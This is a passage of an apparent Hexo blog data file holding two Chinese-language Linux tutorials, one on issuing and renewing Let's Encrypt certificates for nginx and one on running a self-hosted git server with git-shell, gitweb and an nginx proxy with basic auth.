不支持验证网站主的邮箱 *postmaster@example.com*\n\n## 进阶\n\n### 多域名\n\n可以对多个域名生成单个证书，添加多个`-d`参数即可：\n\n```\n./letsencrypt-auto certonly -d xiaoai.me -d www.xiaoai.me -d joaner.com\n```\n\n但是不支持通配符的域名 `*.xiaoai.me`\n\n> Wildcard domains are not supported\n\n### 有效期\n\nLet’s Encrypt的证书有效期只有**90天**，不过可以设置一个crontab任务自动续期证书\n\n```\n/path/to/letsencrypt-auto certonly -d xiaoai.me --renew --agree-dev-preview\nnginx -s reload\n```\n","source":"_posts/e6-8a-98-e8-85-belets-encrypt-e5-85-8d-e8-b4-b9ssl-e8-af-81-e4-b9-a6.md","raw":"---\ntitle: 折腾Let‘s Encrypt免费SSL证书\nid: 223\ncategories:\n  - linux\ndate: 2015-12-04 23:28:27\ntags:\n---\n\n今天开始折腾Let’s Encrypt的免费SSL证书。\n\n> [https://letsencrypt.org/howitworks/](https://letsencrypt.org/howitworks/)\n\n## 介绍\n\n通过一行命令，它会自动完成SSL的域名认证，证书生成等工作，最重要的是免费。虽然WoSign,StartSSL也免费，不过申请有点不方便。\n\n首先，在网站DNS指向的机器上，执行创建证书的命令。比如`xiaoai.me`指向`104.155.200.103`，那么只有在`104.155.200.103`上才能调用命令创建。\n\n```\n$ git clone https://github.com/letsencrypt/letsencrypt\n$ ./letsencrypt/letsencrypt-auto certonly -d xiaoai.me\n```\n\n任何厂商都需要确保证书不会被冒领，因此Let‘s Encrypt会首先验证你是网站域名拥有者。在执行以上命令时，他们的远程服务器会请求申请的网站，通过预先放置的特殊文件等手段来确认身份。\n\n但是这一步遇到了DNSpod在海外（Let‘s Encrypt的服务器）解析超时的问题。要解决这个问题，只能放弃DNSpod，没有其它办法。\n\n```\nFailed authorization procedure. xiaoai.me (tls-sni-01): urn:acme:error:connection :: The server could not connect to the client for DV :: DNS query timed out\n```\n\n> 许多人反映DNSpod有问题：https://github.com/letsencrypt/letsencrypt/issues/1610\n\n我把域名服务器换到google cloud DNS，解决了DNS的问题。\n\n再次运行，填写联系邮箱，同意协议，接下来就成功了。注意在运行命令前需要先关闭占用`80`端口的服务器。\n\n```\n> IMPORTANT NOTES:\n>        - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/xiaoai.me/fullchain.pem. Your cert will expire on 2016-03-03\\. To obtain a new version of the certificate in the future, simply run Let's Encrypt again.\n>        - If like Let's Encrypt, please consider supporting our work by:\n>          Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate\n>          Donating to EFF:                    https://eff.org/donate-le\n```\n\n脚本已经自动生成了一套SSL证书，其位置如下：\n\n```\n$ sudo ls /etc/letsencrypt/live/xiaoai.me\ncert.pem  chain.pem  fullchain.pem  privkey.pem\n```\n\n## 配置\n\n接下来把证书添加到nginx的配置文件中就OK了：\n\n```\nssl on;\nlisten  443 ssl http2;\nserver_name xiaoai.me\nssl_certificate /etc/letsencrypt/live/xiaoai.me/fullchain.pem;\nssl_certificate_key /etc/letsencrypt/live/xiaoai.me/privkey.pem;\n```\n\n整个过程非常简单，现在网站的证书颁发机构变成了 `Let's Encrypt Authority X1`\n\n## 说明\n\n### 验证方式\n\nlet's encrypt 提供了多种方式，验证你是这个域名的拥有者。\n\n- 上面关闭80端口的服务，由创建脚本暂时监听`xiaoai.me:80`端口，以验证网站属于创建者\n- 通过 `--webroot` 参数指定网站根目录，创建脚本会在目录里放置验证文件，用以让远程服务器来访问\n- 通过 `--apache` 参数，自动干预apache服务器，验证原理和上面类似\n- 不支持验证网站主的邮箱 *postmaster@example.com*\n\n## 进阶\n\n### 多域名\n\n可以对多个域名生成单个证书，添加多个`-d`参数即可：\n\n```\n./letsencrypt-auto certonly -d xiaoai.me -d www.xiaoai.me -d joaner.com\n```\n\n但是不支持通配符的域名 `*.xiaoai.me`\n\n> Wildcard domains are not supported\n\n### 有效期\n\nLet’s Encrypt的证书有效期只有**90天**，不过可以设置一个crontab任务自动续期证书\n\n```\n/path/to/letsencrypt-auto certonly -d xiaoai.me --renew --agree-dev-preview\nnginx -s reload\n```\n","slug":"e6-8a-98-e8-85-belets-encrypt-e5-85-8d-e8-b4-b9ssl-e8-af-81-e4-b9-a6","published":1,"updated":"2018-03-06T10:42:09.078Z","_id":"cjef4yhva0010lzlm5ytoo0a5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天开始折腾Let’s Encrypt的免费SSL证书。</p>\n<blockquote>\n<p><a href=\"https://letsencrypt.org/howitworks/\" target=\"_blank\" rel=\"noopener\">https://letsencrypt.org/howitworks/</a></p>\n</blockquote>\n<h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p>通过一行命令，它会自动完成SSL的域名认证，证书生成等工作，最重要的是免费。虽然WoSign,StartSSL也免费，不过申请有点不方便。</p>\n<p>首先，在网站DNS指向的机器上，执行创建证书的命令。比如<code>xiaoai.me</code>指向<code>104.155.200.103</code>，那么只有在<code>104.155.200.103</code>上才能调用命令创建。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git clone https://github.com/letsencrypt/letsencrypt</span><br><span class=\"line\">$ ./letsencrypt/letsencrypt-auto certonly -d xiaoai.me</span><br></pre></td></tr></table></figure>\n<p>任何厂商都需要确保证书不会被冒领，因此Let‘s Encrypt会首先验证你是网站域名拥有者。在执行以上命令时，他们的远程服务器会请求申请的网站，通过预先放置的特殊文件等手段来确认身份。</p>\n<p>但是这一步遇到了DNSpod在海外（Let‘s Encrypt的服务器）解析超时的问题。要解决这个问题，只能放弃DNSpod，没有其它办法。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Failed authorization procedure. xiaoai.me (tls-sni-01): urn:acme:error:connection :: The server could not connect to the client for DV :: DNS query timed out</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>许多人反映DNSpod有问题：<a href=\"https://github.com/letsencrypt/letsencrypt/issues/1610\" target=\"_blank\" rel=\"noopener\">https://github.com/letsencrypt/letsencrypt/issues/1610</a></p>\n</blockquote>\n<p>我把域名服务器换到google cloud DNS，解决了DNS的问题。</p>\n<p>再次运行，填写联系邮箱，同意协议，接下来就成功了。注意在运行命令前需要先关闭占用<code>80</code>端口的服务器。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; IMPORTANT NOTES:</span><br><span class=\"line\">&gt;        - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/xiaoai.me/fullchain.pem. Your cert will expire on 2016-03-03\\. To obtain a new version of the certificate in the future, simply run Let&apos;s Encrypt again.</span><br><span class=\"line\">&gt;        - If like Let&apos;s Encrypt, please consider supporting our work by:</span><br><span class=\"line\">&gt;          Donating to ISRG / Let&apos;s Encrypt:   https://letsencrypt.org/donate</span><br><span class=\"line\">&gt;          Donating to EFF:                    https://eff.org/donate-le</span><br></pre></td></tr></table></figure>\n<p>脚本已经自动生成了一套SSL证书，其位置如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo ls /etc/letsencrypt/live/xiaoai.me</span><br><span class=\"line\">cert.pem  chain.pem  fullchain.pem  privkey.pem</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>接下来把证书添加到nginx的配置文件中就OK了：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssl on;</span><br><span class=\"line\">listen  443 ssl http2;</span><br><span class=\"line\">server_name xiaoai.me</span><br><span class=\"line\">ssl_certificate /etc/letsencrypt/live/xiaoai.me/fullchain.pem;</span><br><span class=\"line\">ssl_certificate_key /etc/letsencrypt/live/xiaoai.me/privkey.pem;</span><br></pre></td></tr></table></figure>\n<p>整个过程非常简单，现在网站的证书颁发机构变成了 <code>Let&#39;s Encrypt Authority X1</code></p>\n<h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><h3 id=\"验证方式\"><a href=\"#验证方式\" class=\"headerlink\" title=\"验证方式\"></a>验证方式</h3><p>let’s encrypt 提供了多种方式，验证你是这个域名的拥有者。</p>\n<ul>\n<li>上面关闭80端口的服务，由创建脚本暂时监听<code>xiaoai.me:80</code>端口，以验证网站属于创建者</li>\n<li>通过 <code>--webroot</code> 参数指定网站根目录，创建脚本会在目录里放置验证文件，用以让远程服务器来访问</li>\n<li>通过 <code>--apache</code> 参数，自动干预apache服务器，验证原理和上面类似</li>\n<li>不支持验证网站主的邮箱 <a href=\"mailto:*postmaster@example.com\" target=\"_blank\" rel=\"noopener\">*postmaster@example.com</a>*</li>\n</ul>\n<h2 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h2><h3 id=\"多域名\"><a href=\"#多域名\" class=\"headerlink\" title=\"多域名\"></a>多域名</h3><p>可以对多个域名生成单个证书，添加多个<code>-d</code>参数即可：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./letsencrypt-auto certonly -d xiaoai.me -d www.xiaoai.me -d joaner.com</span><br></pre></td></tr></table></figure>\n<p>但是不支持通配符的域名 <code>*.xiaoai.me</code></p>\n<blockquote>\n<p>Wildcard domains are not supported</p>\n</blockquote>\n<h3 id=\"有效期\"><a href=\"#有效期\" class=\"headerlink\" title=\"有效期\"></a>有效期</h3><p>Let’s Encrypt的证书有效期只有<strong>90天</strong>，不过可以设置一个crontab任务自动续期证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/path/to/letsencrypt-auto certonly -d xiaoai.me --renew --agree-dev-preview</span><br><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>今天开始折腾Let’s Encrypt的免费SSL证书。</p>\n<blockquote>\n<p><a href=\"https://letsencrypt.org/howitworks/\" target=\"_blank\" rel=\"noopener\">https://letsencrypt.org/howitworks/</a></p>\n</blockquote>\n<h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p>通过一行命令，它会自动完成SSL的域名认证，证书生成等工作，最重要的是免费。虽然WoSign,StartSSL也免费，不过申请有点不方便。</p>\n<p>首先，在网站DNS指向的机器上，执行创建证书的命令。比如<code>xiaoai.me</code>指向<code>104.155.200.103</code>，那么只有在<code>104.155.200.103</code>上才能调用命令创建。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git clone https://github.com/letsencrypt/letsencrypt</span><br><span class=\"line\">$ ./letsencrypt/letsencrypt-auto certonly -d xiaoai.me</span><br></pre></td></tr></table></figure>\n<p>任何厂商都需要确保证书不会被冒领，因此Let‘s Encrypt会首先验证你是网站域名拥有者。在执行以上命令时，他们的远程服务器会请求申请的网站，通过预先放置的特殊文件等手段来确认身份。</p>\n<p>但是这一步遇到了DNSpod在海外（Let‘s Encrypt的服务器）解析超时的问题。要解决这个问题，只能放弃DNSpod，没有其它办法。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Failed authorization procedure. xiaoai.me (tls-sni-01): urn:acme:error:connection :: The server could not connect to the client for DV :: DNS query timed out</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>许多人反映DNSpod有问题：<a href=\"https://github.com/letsencrypt/letsencrypt/issues/1610\" target=\"_blank\" rel=\"noopener\">https://github.com/letsencrypt/letsencrypt/issues/1610</a></p>\n</blockquote>\n<p>我把域名服务器换到google cloud DNS，解决了DNS的问题。</p>\n<p>再次运行，填写联系邮箱，同意协议，接下来就成功了。注意在运行命令前需要先关闭占用<code>80</code>端口的服务器。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; IMPORTANT NOTES:</span><br><span class=\"line\">&gt;        - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/xiaoai.me/fullchain.pem. Your cert will expire on 2016-03-03\\. To obtain a new version of the certificate in the future, simply run Let&apos;s Encrypt again.</span><br><span class=\"line\">&gt;        - If like Let&apos;s Encrypt, please consider supporting our work by:</span><br><span class=\"line\">&gt;          Donating to ISRG / Let&apos;s Encrypt:   https://letsencrypt.org/donate</span><br><span class=\"line\">&gt;          Donating to EFF:                    https://eff.org/donate-le</span><br></pre></td></tr></table></figure>\n<p>脚本已经自动生成了一套SSL证书，其位置如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo ls /etc/letsencrypt/live/xiaoai.me</span><br><span class=\"line\">cert.pem  chain.pem  fullchain.pem  privkey.pem</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>接下来把证书添加到nginx的配置文件中就OK了：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssl on;</span><br><span class=\"line\">listen  443 ssl http2;</span><br><span class=\"line\">server_name xiaoai.me</span><br><span class=\"line\">ssl_certificate /etc/letsencrypt/live/xiaoai.me/fullchain.pem;</span><br><span class=\"line\">ssl_certificate_key /etc/letsencrypt/live/xiaoai.me/privkey.pem;</span><br></pre></td></tr></table></figure>\n<p>整个过程非常简单，现在网站的证书颁发机构变成了 <code>Let&#39;s Encrypt Authority X1</code></p>\n<h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><h3 id=\"验证方式\"><a href=\"#验证方式\" class=\"headerlink\" title=\"验证方式\"></a>验证方式</h3><p>let’s encrypt 提供了多种方式，验证你是这个域名的拥有者。</p>\n<ul>\n<li>上面关闭80端口的服务，由创建脚本暂时监听<code>xiaoai.me:80</code>端口，以验证网站属于创建者</li>\n<li>通过 <code>--webroot</code> 参数指定网站根目录，创建脚本会在目录里放置验证文件，用以让远程服务器来访问</li>\n<li>通过 <code>--apache</code> 参数，自动干预apache服务器，验证原理和上面类似</li>\n<li>不支持验证网站主的邮箱 <a href=\"mailto:*postmaster@example.com\" target=\"_blank\" rel=\"noopener\">*postmaster@example.com</a>*</li>\n</ul>\n<h2 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h2><h3 id=\"多域名\"><a href=\"#多域名\" class=\"headerlink\" title=\"多域名\"></a>多域名</h3><p>可以对多个域名生成单个证书，添加多个<code>-d</code>参数即可：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./letsencrypt-auto certonly -d xiaoai.me -d www.xiaoai.me -d joaner.com</span><br></pre></td></tr></table></figure>\n<p>但是不支持通配符的域名 <code>*.xiaoai.me</code></p>\n<blockquote>\n<p>Wildcard domains are not supported</p>\n</blockquote>\n<h3 id=\"有效期\"><a href=\"#有效期\" class=\"headerlink\" title=\"有效期\"></a>有效期</h3><p>Let’s Encrypt的证书有效期只有<strong>90天</strong>，不过可以设置一个crontab任务自动续期证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/path/to/letsencrypt-auto certonly -d xiaoai.me --renew --agree-dev-preview</span><br><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n"},{"title":"搭建自己的git服务器","id":"70","date":"2015-06-06T17:46:57.000Z","_content":"\ngithub私有仓库的费用太贵，有VPS可以自己搭建一个专属git服务器\n\n其实没什么需要安装的，git的默认协议SSH不需要什么配置，主要是方便和安全方面的优化\n\n## 初始化环境\n\n为了安全，我们为git仓库专门设置一个管理用户**git**，约定使用 **/srv/git** 放置仓库\n```\n$ sudo useradd \\\n--create-home \\\n--home-dir=/srv/git \\\n--root=/srv/git \\\n--base-dir=/srv/git \\\n--shell=/usr/bin/git-shell \\\ngit\n$ sudo passwd git\n```\n\n### 上面的参数作用\n\n```\n--create-home --home-dir=/srv/git\n```\n创建用户主目录，将来可以添加SSH KEY登录方式，和代码仓库放在一起方便管理\n```\n--root=/srv/git\n```\n限制这个用户的访问目录在/srv/git，不能访问其它路径，这是出于安全考虑\n```\n--base-dir=/srv/git\n```\n用户base目录，即默认的父目录．帮助简化了克隆时的目录前缀\n```\n--shell=/usr/bin/git-shell\n```\n只允许用户用于管理仓库，不得执行其它命令\n\n## 创建仓库\n\n初始化一个裸仓库，即只包含仓库信息，不包含代码\n```\n$ sudo git --bare init /srv/git/MY_PROJECT.git\n```\n不需要其它配置了，就这么简单\n\n## 从客户端克隆\n\nMYHOST就是VPS的主机地址\n```\n$ git clone git@MYHOST:MY_PROJECT.git\n```\n\n#### 主机名后的目录只需要填写仓库目录\n\n这是创建用户时指定的 **--base-dir** 立的功，让你不用输入完整的目录 **/srv/git/MY_PROJECT.git**\n\n#### 尝试用git用户登录会被阻止\n\n```\n$ ssh git@MYHOST\ngit@MYHOST's password:\nfatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.\nConnection to MYHOST closed.\n```\n\n## web界面\n\n#### 首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\n\ngitweb默认需要在 **/var/www/git** 下放置cgi程序和仓库代码，但我们把仓库安装在了 **/srv/git** 下，所以做个软链接\n```\n# ln -s /srv/git /var/www/git\n# yum install gitweb\n# ls /var/www/git\ngitweb.cgi static PROJECT.git\n\n```\n可以看到yum安装后多出了这两个: **gitweb.cgi static**\n\n#### 接下来启动gitweb服务\n\n刚才安装的gitweb只是一套动态程序，HTTP访问还要借助lighttpd apache等web服务器．而git自带的命令instaweb可以自动创建web服务器的配置文件．指定--httpd参数为lighttpd即可\n```\n# sudo -i\n# cd /var/www/git\n# git init\n\n# yum install lighttpd\n# git instaweb --httpd=lighttpd --port=1234\nNo known browser available.\nhttp://127.0.0.1:1234\n\n```\n\n##### 上面的命令解释:\n\n```\n# sudo -i\n# cd /var/www/git\n```\n因为 /var/www/git 是git用户的home目录，因此普通用户可能没有权限cd，所以需要-i参数保持root权限.\n\n注意：git instaweb 不能指定document root目录，所以在哪个目录下执行，就展示那个目录下的仓库．因而需要先**cd**到这里\n```\n# git init\n```\ngit instaweb创建的web服务器配置文件，需要一个git仓库来存放．\n\n#### 外界访问控制\n\n到这里就可以访问git仓库了，但没有完，还需要外界可以访问，并且要限制访问．这时可以借助nginx，或者修改lighttpd的配置文件\n```\nserver {\n    listen 80;\n    server_name git.MYHOST.COM\n    location / {\n        auth_basic \"git web require auth\";\n        auth_basic_user_file /srv/etc/passwd;\n        proxy_pass http://127.0.0.1:1234/;\n    }\n}\n\n```\n有关auth_basic的配置可以参阅 [http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html](http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html)\n\n#### 大功告成\n\n到这一步就结束了，现在访问 http://git.MYHOST.COM/ 即可浏览仓库信息\n\n如果你觉得这个web界面太丑陋的话，可以看看 [https://github.com/kogakure/gitweb-theme](https://github.com/kogakure/gitweb-theme) ，这个项目提供了更优雅的主题界面：[http://kogakure.github.io/gitweb-theme/](http://kogakure.github.io/gitweb-theme/)\n","source":"_posts/e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84git-e6-9c-8d-e5-8a-a1-e5-99-a8.md","raw":"---\ntitle: 搭建自己的git服务器\nid: 70\ncategories:\n  - linux\ndate: 2015-06-07 01:46:57\ntags:\n---\n\ngithub私有仓库的费用太贵，有VPS可以自己搭建一个专属git服务器\n\n其实没什么需要安装的，git的默认协议SSH不需要什么配置，主要是方便和安全方面的优化\n\n## 初始化环境\n\n为了安全，我们为git仓库专门设置一个管理用户**git**，约定使用 **/srv/git** 放置仓库\n```\n$ sudo useradd \\\n--create-home \\\n--home-dir=/srv/git \\\n--root=/srv/git \\\n--base-dir=/srv/git \\\n--shell=/usr/bin/git-shell \\\ngit\n$ sudo passwd git\n```\n\n### 上面的参数作用\n\n```\n--create-home --home-dir=/srv/git\n```\n创建用户主目录，将来可以添加SSH KEY登录方式，和代码仓库放在一起方便管理\n```\n--root=/srv/git\n```\n限制这个用户的访问目录在/srv/git，不能访问其它路径，这是出于安全考虑\n```\n--base-dir=/srv/git\n```\n用户base目录，即默认的父目录．帮助简化了克隆时的目录前缀\n```\n--shell=/usr/bin/git-shell\n```\n只允许用户用于管理仓库，不得执行其它命令\n\n## 创建仓库\n\n初始化一个裸仓库，即只包含仓库信息，不包含代码\n```\n$ sudo git --bare init /srv/git/MY_PROJECT.git\n```\n不需要其它配置了，就这么简单\n\n## 从客户端克隆\n\nMYHOST就是VPS的主机地址\n```\n$ git clone git@MYHOST:MY_PROJECT.git\n```\n\n#### 主机名后的目录只需要填写仓库目录\n\n这是创建用户时指定的 **--base-dir** 立的功，让你不用输入完整的目录 **/srv/git/MY_PROJECT.git**\n\n#### 尝试用git用户登录会被阻止\n\n```\n$ ssh git@MYHOST\ngit@MYHOST's password:\nfatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.\nConnection to MYHOST closed.\n```\n\n## web界面\n\n#### 首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\n\ngitweb默认需要在 **/var/www/git** 下放置cgi程序和仓库代码，但我们把仓库安装在了 **/srv/git** 下，所以做个软链接\n```\n# ln -s /srv/git /var/www/git\n# yum install gitweb\n# ls /var/www/git\ngitweb.cgi static PROJECT.git\n\n```\n可以看到yum安装后多出了这两个: **gitweb.cgi static**\n\n#### 接下来启动gitweb服务\n\n刚才安装的gitweb只是一套动态程序，HTTP访问还要借助lighttpd apache等web服务器．而git自带的命令instaweb可以自动创建web服务器的配置文件．指定--httpd参数为lighttpd即可\n```\n# sudo -i\n# cd /var/www/git\n# git init\n\n# yum install lighttpd\n# git instaweb --httpd=lighttpd --port=1234\nNo known browser available.\nhttp://127.0.0.1:1234\n\n```\n\n##### 上面的命令解释:\n\n```\n# sudo -i\n# cd /var/www/git\n```\n因为 /var/www/git 是git用户的home目录，因此普通用户可能没有权限cd，所以需要-i参数保持root权限.\n\n注意：git instaweb 不能指定document root目录，所以在哪个目录下执行，就展示那个目录下的仓库．因而需要先**cd**到这里\n```\n# git init\n```\ngit instaweb创建的web服务器配置文件，需要一个git仓库来存放．\n\n#### 外界访问控制\n\n到这里就可以访问git仓库了，但没有完，还需要外界可以访问，并且要限制访问．这时可以借助nginx，或者修改lighttpd的配置文件\n```\nserver {\n    listen 80;\n    server_name git.MYHOST.COM\n    location / {\n        auth_basic \"git web require auth\";\n        auth_basic_user_file /srv/etc/passwd;\n        proxy_pass http://127.0.0.1:1234/;\n    }\n}\n\n```\n有关auth_basic的配置可以参阅 [http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html](http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html)\n\n#### 大功告成\n\n到这一步就结束了，现在访问 http://git.MYHOST.COM/ 即可浏览仓库信息\n\n如果你觉得这个web界面太丑陋的话，可以看看 [https://github.com/kogakure/gitweb-theme](https://github.com/kogakure/gitweb-theme) ，这个项目提供了更优雅的主题界面：[http://kogakure.github.io/gitweb-theme/](http://kogakure.github.io/gitweb-theme/)\n","slug":"e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84git-e6-9c-8d-e5-8a-a1-e5-99-a8","published":1,"updated":"2018-03-05T13:02:24.228Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvb0012lzlm71kp34l1","content":"<p>github私有仓库的费用太贵，有VPS可以自己搭建一个专属git服务器</p>\n<p>其实没什么需要安装的，git的默认协议SSH不需要什么配置，主要是方便和安全方面的优化</p>\n<h2 id=\"初始化环境\"><a href=\"#初始化环境\" class=\"headerlink\" title=\"初始化环境\"></a>初始化环境</h2><p>为了安全，我们为git仓库专门设置一个管理用户<strong>git</strong>，约定使用 <strong>/srv/git</strong> 放置仓库<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo useradd \\</span><br><span class=\"line\">--create-home \\</span><br><span class=\"line\">--home-dir=/srv/git \\</span><br><span class=\"line\">--root=/srv/git \\</span><br><span class=\"line\">--base-dir=/srv/git \\</span><br><span class=\"line\">--shell=/usr/bin/git-shell \\</span><br><span class=\"line\">git</span><br><span class=\"line\">$ sudo passwd git</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"上面的参数作用\"><a href=\"#上面的参数作用\" class=\"headerlink\" title=\"上面的参数作用\"></a>上面的参数作用</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--create-home --home-dir=/srv/git</span><br></pre></td></tr></table></figure>\n<p>创建用户主目录，将来可以添加SSH KEY登录方式，和代码仓库放在一起方便管理<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--root=/srv/git</span><br></pre></td></tr></table></figure></p>\n<p>限制这个用户的访问目录在/srv/git，不能访问其它路径，这是出于安全考虑<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--base-dir=/srv/git</span><br></pre></td></tr></table></figure></p>\n<p>用户base目录，即默认的父目录．帮助简化了克隆时的目录前缀<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--shell=/usr/bin/git-shell</span><br></pre></td></tr></table></figure></p>\n<p>只允许用户用于管理仓库，不得执行其它命令</p>\n<h2 id=\"创建仓库\"><a href=\"#创建仓库\" class=\"headerlink\" title=\"创建仓库\"></a>创建仓库</h2><p>初始化一个裸仓库，即只包含仓库信息，不包含代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo git --bare init /srv/git/MY_PROJECT.git</span><br></pre></td></tr></table></figure></p>\n<p>不需要其它配置了，就这么简单</p>\n<h2 id=\"从客户端克隆\"><a href=\"#从客户端克隆\" class=\"headerlink\" title=\"从客户端克隆\"></a>从客户端克隆</h2><p>MYHOST就是VPS的主机地址<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git clone git@MYHOST:MY_PROJECT.git</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"主机名后的目录只需要填写仓库目录\"><a href=\"#主机名后的目录只需要填写仓库目录\" class=\"headerlink\" title=\"主机名后的目录只需要填写仓库目录\"></a>主机名后的目录只需要填写仓库目录</h4><p>这是创建用户时指定的 <strong>–base-dir</strong> 立的功，让你不用输入完整的目录 <strong>/srv/git/MY_PROJECT.git</strong></p>\n<h4 id=\"尝试用git用户登录会被阻止\"><a href=\"#尝试用git用户登录会被阻止\" class=\"headerlink\" title=\"尝试用git用户登录会被阻止\"></a>尝试用git用户登录会被阻止</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh git@MYHOST</span><br><span class=\"line\">git@MYHOST&apos;s password:</span><br><span class=\"line\">fatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.</span><br><span class=\"line\">Connection to MYHOST closed.</span><br></pre></td></tr></table></figure>\n<h2 id=\"web界面\"><a href=\"#web界面\" class=\"headerlink\" title=\"web界面\"></a>web界面</h2><h4 id=\"首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\"><a href=\"#首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\" class=\"headerlink\" title=\"首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\"></a>首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．</h4><p>gitweb默认需要在 